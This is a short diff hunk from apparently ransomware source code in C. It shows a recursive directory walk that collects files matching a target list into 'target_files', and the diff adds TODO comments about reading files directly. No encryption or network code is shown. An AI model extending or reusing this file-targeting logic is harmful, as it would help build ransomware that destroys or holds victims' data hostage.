@@ -69,6 +69,9 @@ node_t *recurse_ls(char *dirname, ransom_t *ransom)
 			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
 			recurse_ls(filepath, ransom);
 		}
+		/** TODO: Readfile here directly, instead of building a linked list. ***/
+		/*        Done with a linked list here for development purposes      **/
+		/*        Will have to rebuild struct + simplify several pieces      */
 		else if (binary_search_string(read->d_name, len_filename, ransom) != 0)
 			add_node(filepath, &ransom->target_files);
 	}
